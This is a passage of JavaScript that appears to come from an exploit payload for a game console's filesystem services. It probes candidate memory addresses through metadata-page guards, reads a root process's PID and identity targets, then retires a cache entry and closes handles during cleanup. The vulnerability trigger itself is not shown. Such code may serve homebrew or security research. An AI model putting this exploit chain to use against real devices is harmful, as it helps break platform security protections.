                                addressPlan = metadataPageResult.addressPlan;
                                addressCopy = metadataPageResult.addressCopy;
                                if (!metadataPageResult.ok) {
                                    addressFailureReason = "metadata-page-guard-failed";
                                    addressFailureDetail = metadataPageResult.error ||
                                        "reciprocal-link or page guard rejected";
                                    if (metadataPageResult.error) {
                                        await log("METADATA: page probe stopped: " +
                                            metadataPageResult.error);
                                    }
                                    if (metadataPageResult.continueScan) continue;
                                    stopSeedScan = true;
                                    break;
                                }

                                metadataPageChecks++;
                                rootCandidateRetryable = false;
                                rootCandidateScans++;
                                rootScansForSeed++;
                                if (reportProgress)
                                    await reportProgress("Metadata page passed; capturing and scanning the FSP root...");
                                await log("ROOT: metadata page " +
                                    (mi + 1) + "/" + metadataDiscovery.anchors.length +
                                    " passed its reciprocal-link guard; checking domain table");
                                var rootStartedAt = collectTimingProfile ? Date.now() : 0;
                                try {
                                    var identityResult =
                                        await helpers.inspectFspIdentityTargetsReadOnly({
                                            config, addressPlan, candidateHandle,
                                            domainSession, rootCandidateRetryable,
                                            rootPidRead, rootSession,
                                            verifiedIdentityTargets,
                                            reportProgress
                                        });
                                    rootStageVerified = identityResult.ok;
                                    domainSession = identityResult.domainSession;
                                    rootCandidateRetryable = identityResult.rootCandidateRetryable;
                                    rootPidRead = identityResult.rootPidRead;
                                    verifiedIdentityTargets = identityResult.verifiedIdentityTargets;
                                    if (collectTimingProfile && identityResult.rootTiming) {
                                        timingProfile.rootClear =
                                            (timingProfile.rootClear || 0) +
                                            identityResult.rootTiming.clearMs;
                                        timingProfile.rootRead =
                                            (timingProfile.rootRead || 0) +
                                            identityResult.rootTiming.readMs;
                                        timingProfile.rootScan =
                                            (timingProfile.rootScan || 0) +
                                            identityResult.rootTiming.scanMs;
                                        timingProfile.rootLookup =
                                            (timingProfile.rootLookup || 0) +
                                            identityResult.rootTiming.lookupMs;
                                        timingProfile.rootChunksRead =
                                            (timingProfile.rootChunksRead || 0) +
                                            identityResult.rootTiming.chunksRead;
                                    }
                                } catch (rootError) {
                                    addressFailureReason = "root-inspection-failed";
                                    addressFailureDetail = rootError.message;
                                    await log("ROOT: inspection aborted: " +
                                        rootError.message);
                                    rootStageVerified = false;
                                    rootCandidateRetryable = false;
                                } finally {
                                    if (collectTimingProfile)
                                        timingProfile.root = (timingProfile.root || 0) +
                                            Date.now() - rootStartedAt;
                                }
                                if (rootStageVerified) break;
                                if (rootCandidateRetryable) continue;
                                stopSeedScan = true;
                                break;
                            }

                            if (rootStageVerified) break;
                            if (rootCandidateScans >= config.MAX_ROOT_LAYOUT_SCANS) {
                                await log("ROOT: metadata-page scan cap reached");
                                break;
                            }
                            if (metadataPageProbes >= config.MAX_METADATA_PAGE_PROBES) {
                                await log("METADATA: page-probe cap reached");
                                break;
                            }
                            if (metadataDiscovery.capReached) {
                                await log("METADATA: external-link candidate cap reached");
                                break;
                            }
                            if (metadataDiscovery.stopAfterAnchors) {
                                await log("METADATA: checked previously valid " +
                                    "anchors, then stopped after a later read error");
                                break;
                            }
                            if (rootCandidateRetryable && !stopSeedScan &&
                                ai + 1 < candidatePlans.length) {
                                await log("ROOT: no table match for the " +
                                    "validated metadata pages; trying the next seed");
                                continue;
                            }
                            if (tryNextSeed && ai + 1 < candidatePlans.length) {
                                var poolHypotheses =
                                    metadataDiscovery.poolCandidates || 0;
                                var externalChecks =
                                    metadataDiscovery.externalLinkChecks || 0;
                                await log("METADATA: no external-link anchor " +
                                    "qualified; pool hypotheses=" + poolHypotheses +
                                    " checks=" + externalChecks + "/" +
                                    poolHypotheses + "; trying the next " +
                                    "changed-link seed");
                                continue;
                            }
                            if (!stopSeedScan && metadataDiscovery.anchors.length > 0 &&
                                rootScansForSeed === 0 && ai + 1 < candidatePlans.length) {
                                await log("METADATA: no page passed its " +
                                    "reciprocal-link guard; trying the next seed");
                                continue;
                            }
                            if (rootCandidateRetryable) {
                                await log("ROOT: no further seed candidate is available");
                            }
                            break;
                        }
                        if (!candidateResult.continueScan) {
                            addressFailureReason = "address-candidate-read-or-copy-failed";
                            await log("ADDRESS: stopped candidate scan after a read/copy error");
                            break;
                        }
                        if (!candidateResult.verified) {
                            addressFailureReason = "address-read-guards-rejected-candidates";
                        }
                        if (ai + 1 < candidatePlans.length)
                            await log("ADDRESS: trying the next candidate");
                    }

                    if (!addressReadVerified && addressCandidatesTested > 0)
                        await log("ADDRESS: no candidate passed the read guards (tested=" +
                            addressCandidatesTested + ")");
                }
            }
        }
    } else {
        if (!addressFailureReason)
            addressFailureReason = "address-plan-preconditions-not-met";
        await log("ADDRESS: skipped; alias or qualified pointer unavailable");
    }

    // S19 runs inside the candidate loop above. No host-side memory endpoint is
    // used; address reads and comparisons run in this payload through the
    // existing candidate IStorage path. fsp-srv/domain/clone IPCs stay in-console.
    if (!addressReadVerified) {
        if (!addressFailureReason)
            addressFailureReason = "address-read-not-qualified";
        await log("ROOT: skipped; address-read guards did not qualify");
    } else if (!rootStageVerified) {
        addressFailureReason = "root-identity-not-verified";
        if (!addressFailureDetail && rootCandidateRetryable)
            addressFailureDetail = "more-candidates-may-qualify";
        else if (!addressFailureDetail && rootPidRead)
            addressFailureDetail = "root-PID-read-but-identity-guards-rejected";
    } else {
        addressFailureReason = null;
        addressFailureDetail = null;
    }
  return {ok: true, addressCopy, addressPlan, addressReadVerified,
      addressCandidatesTested, changedLinkCandidates, validAddressPlans,
      addressAliasRequalified, bucketPeriodQualified, storageSizeError,
      addressFailureReason, addressFailureDetail,
      metadataAnchorChecks, metadataPageChecks,
      metadataPageProbes, rootCandidateRetryable, rootCandidateScans,
      rootPidRead, rootStageVerified, selectedAddressCandidate, domainSession,
      verifiedIdentityTargets, timingProfile};
}

export async function retireCandidateCacheAndClose({
  helpers,
  addressCopy,
  candidateCacheNeedsRetirement,
  candidateHandle,
  retireRetainedEndpoint,
  workerStateSafe,
}) {
    // S21: Retire the synthetic cache entry before closing the candidate.
    let candidateCacheRetired = false;
    var candidateCloseSafe = workerStateSafe;
    var candidateCloseResult = null;
    var retirementFailureReason = null;
    if (addressCopy && addressCopy.retainedEndpointActive) {
        if (!candidateCloseSafe || !candidateHandle ||
            typeof retireRetainedEndpoint !== "function") {
            await log("CACHE: retained endpoint retirement or candidate close " +
                "skipped (restoration/handle state is unsafe)");
            addressCopy = {...addressCopy, retainedEndpointUnsafe: true,
                workerStateSafe: false};
            return {ok: false, addressCopy, candidateCacheRetired,
                candidateHandle, workerStateSafe: false,
                failureReason: "retained-endpoint-state-unsafe"};
        }
        try {
            var retainedRetirement = await retireRetainedEndpoint();
            if (!retainedRetirement || !retainedRetirement.retired)
                throw new Error("retained endpoint did not confirm retirement");
            addressCopy = retainedRetirement.addressCopy || addressCopy;
        } catch (retirementError) {
            await log("CACHE: retained endpoint retirement failed: " +
                retirementError.message);
            addressCopy = {...addressCopy, retainedEndpointUnsafe: true,
                workerStateSafe: false};
            return {ok: false, addressCopy, candidateCacheRetired,
                candidateHandle, workerStateSafe: false,
                failureReason: "retained-endpoint-retirement-failed: " +
                    retirementError.message};
        }

        try {
            candidateCloseResult = Number(closeHandle(candidateHandle)) >>> 0;
            await log("CACHE: retained candidate closed rc=" +
                hex32(candidateCloseResult));
            if (candidateCloseResult !== 0) {
                addressCopy = {...addressCopy, retainedEndpointUnsafe: true,
                    workerStateSafe: false};
                return {ok: false, addressCopy, candidateCacheRetired,
                    candidateHandle, workerStateSafe: false,
                    candidateCloseResult,
                    failureReason: "retained-candidate-close-failed"};
            }
            candidateHandle = 0;
            candidateCacheRetired = true;
            addressCopy = {...addressCopy, retainedEndpointActive: false,
                retainedEndpointRetired: true, candidateCacheRetired: true};
        } catch (closeError) {
            await log("CACHE: retained candidate close threw: " +
                closeError.message);
            addressCopy = {...addressCopy, retainedEndpointUnsafe: true,
                workerStateSafe: false};
            return {ok: false, addressCopy, candidateCacheRetired,
                candidateHandle, workerStateSafe: false,
                candidateCloseResult,
                failureReason: "retained-candidate-close-threw: " +
                    closeError.message};
        }
        return {ok: true, addressCopy, candidateCacheRetired,
            candidateHandle, candidateCloseResult,
            workerStateSafe: candidateCloseSafe};
    }
    if (candidateHandle && candidateCacheNeedsRetirement && candidateCloseSafe) {
        var retirement = await helpers.retireCandidateCache({
            candidateHandle, candidateCacheNeedsRetirement,
            candidateCacheRetired, addressCopy
        });
        candidateCloseSafe = retirement.ok;
        candidateCacheRetired = retirement.candidateCacheRetired;
        if (!retirement.ok)
            retirementFailureReason = "candidate-cache-retirement-failed";
        addressCopy = {...retirement.addressCopy, candidateCacheRetired};
    }

    if (candidateHandle && candidateCloseSafe) {
        candidateCloseResult = Number(closeHandle(candidateHandle)) >>> 0;
        candidateHandle = 0;
        await log("CACHE: candidate closed rc=" + hex32(candidateCloseResult));
        if (candidateCloseResult !== 0)
            retirementFailureReason = "candidate-close-failed";
    } else if (candidateHandle) {
        retirementFailureReason = retirementFailureReason ||
            "candidate-close-skipped-unsafe-state";
        await log("CACHE: candidate close skipped (worker/cache state unsafe)");
    }

  return {ok: true, addressCopy, candidateCacheRetired, candidateHandle,
      workerStateSafe: candidateCloseSafe, candidateCloseResult,
      failureReason: retirementFailureReason};
}

export async function cleanupScratchAndHandles({
  SCRATCH_DIR,
  auxiliaryStorageHandle,
  candidateCacheNeedsRetirement,
  candidateCacheRetired,
  candidateHandle,
  retainedEndpointActive,
  domainSession,
  extentTriggerHandle,
  extraStorages,
  pinHandle,
  rootClones,
  rootSession,
  saveClones,
  savedHandle,
  storageHandle,
  temporaryHandle,
  triggerHandle,
  workerStateSafe
}) {
    // S22: Cleanup. Report a failed or skipped cleanup as unsafe to retry.
    var cleanupAttempted = false;
    var cleanupDeleteTransport = null;
    var cleanupRemoveResult = null;
    var cleanupCommitTransport = null;
    var cleanupCommitResult = null;
    var cleanupHandlesClosed = 0;
    var cleanupExpectedHandles = 0;
    var cleanupCloseFailures = [];
    var cleanupErrors = [];
    var cleanupAllowed = workerStateSafe && (retainedEndpointActive ||
        !candidateCacheNeedsRetirement || candidateCacheRetired || !candidateHandle);
    var cleanupSkipReason = workerStateSafe
        ? "candidate-cache-not-retired" : "worker-state-unsafe";

    if (cleanupAllowed) {
        var countExpectedHandle = function(handle) {
            if (handle) cleanupExpectedHandles++;
        };
        for (var ci = 0; ci < saveClones.length; ci++)
            countExpectedHandle(saveClones[ci]);
        for (var ci = 0; ci < rootClones.length; ci++)
            countExpectedHandle(rootClones[ci]);
        countExpectedHandle(triggerHandle);
        countExpectedHandle(extentTriggerHandle);
        countExpectedHandle(savedHandle);
        countExpectedHandle(temporaryHandle);
        countExpectedHandle(storageHandle);
        countExpectedHandle(auxiliaryStorageHandle);
        countExpectedHandle(pinHandle);
        for (var cei = 0; cei < extraStorages.length; cei++)
            countExpectedHandle(extraStorages[cei]);
        if (domainSession) countExpectedHandle(domainSession.handle);
        countExpectedHandle(rootSession);
        cleanupAttempted = true;
        await log("CLEANUP: removing " + SCRATCH_DIR + " and committing");
        try {
            var deleteStatus = ipcDeleteDirectoryRecursivelyChecked(
                savedHandle, SCRATCH_DIR);
            cleanupDeleteTransport = deleteStatus.transport;
            cleanupRemoveResult = deleteStatus.result;
        } catch (error) {
            cleanupErrors.push("delete=" + String(error));
        }
        try {
            var commitStatus = ipcCommitChecked(savedHandle);
            cleanupCommitTransport = commitStatus.transport;
            cleanupCommitResult = commitStatus.result;
        } catch (error) {
            cleanupErrors.push("commit=" + String(error));
        }

        var closeForCleanup = function(handle, label) {
            if (!handle) return;
            try {
                var result = Number(closeHandle(handle)) >>> 0;
                if (result !== 0) {
                    cleanupCloseFailures.push(label + "=" + hex32(result));
                } else {
                    cleanupHandlesClosed++;
                }
            } catch (error) {
                cleanupCloseFailures.push(label + "=throw:" + String(error));
            }
        };

        for (var i = 0; i < saveClones.length; i++)
            closeForCleanup(saveClones[i], "save-clone-" + i);
        for (var i = 0; i < rootClones.length; i++)
            closeForCleanup(rootClones[i], "root-clone-" + i);
        closeForCleanup(triggerHandle, "trigger");
        closeForCleanup(extentTriggerHandle, "extent-trigger");
        closeForCleanup(savedHandle, "save-fs");
        closeForCleanup(temporaryHandle, "temporary-fs");
        closeForCleanup(storageHandle, "storage");
        closeForCleanup(auxiliaryStorageHandle, "aux-storage");
        closeForCleanup(pinHandle, "pin");
        for (var ei = 0; ei < extraStorages.length; ei++)
            closeForCleanup(extraStorages[ei], "extra-storage-" + ei);
        if (domainSession) {
            closeForCleanup(domainSession.handle, "identity-domain-session");
            domainSession = null;
        }
        closeForCleanup(rootSession, "fsp-session");

        var cleanupDeleteTxText = cleanupDeleteTransport === null
            ? "THREW" : hex32(cleanupDeleteTransport);
        var cleanupDeleteText = cleanupRemoveResult === null
            ? "NA" : hex32(cleanupRemoveResult);
        var cleanupCommitTxText = cleanupCommitTransport === null
            ? "THREW" : hex32(cleanupCommitTransport);
        var cleanupCommitText = cleanupCommitResult === null
            ? "NA" : hex32(cleanupCommitResult);
        await log("CLEANUP: " + SCRATCH_DIR +
            " deleteTx=" + cleanupDeleteTxText + " delete=" + cleanupDeleteText +
            " commitTx=" + cleanupCommitTxText + " commit=" + cleanupCommitText +
            " handlesClosed=" + cleanupHandlesClosed +
            "/" + cleanupExpectedHandles +
            " closeErrors=" + (cleanupCloseFailures.join(",") || "none") +
            " errors=" + (cleanupErrors.join(",") || "none"));
    } else {
        await log("CLEANUP: skipped (worker/cache state unsafe)");
    }

    var cleanupOk = cleanupAttempted && cleanupDeleteTransport === 0 &&
        cleanupRemoveResult === 0 && cleanupCommitTransport === 0 &&
        cleanupCommitResult === 0 &&
        cleanupHandlesClosed === cleanupExpectedHandles &&
        cleanupCloseFailures.length === 0 && cleanupErrors.length === 0;
    return {
        // Preserve the legacy `ok` contract for callers outside this workflow;
        // the payload consumes cleanupVerified for its explicit status line.
        ok: true,
        cleanupVerified: cleanupOk,
        attempted: cleanupAttempted,
        skipped: !cleanupAttempted,
        workerStateSafe: Boolean(workerStateSafe),
        skipReason: cleanupAttempted ? null : cleanupSkipReason,
        deleteTransport: cleanupDeleteTransport,
        deleteResult: cleanupRemoveResult,
        commitTransport: cleanupCommitTransport,
        commitResult: cleanupCommitResult,
        handlesClosed: cleanupHandlesClosed,
        expectedHandles: cleanupExpectedHandles,
        closeErrors: cleanupCloseFailures,
        errors: cleanupErrors,
        domainSession
    };
}
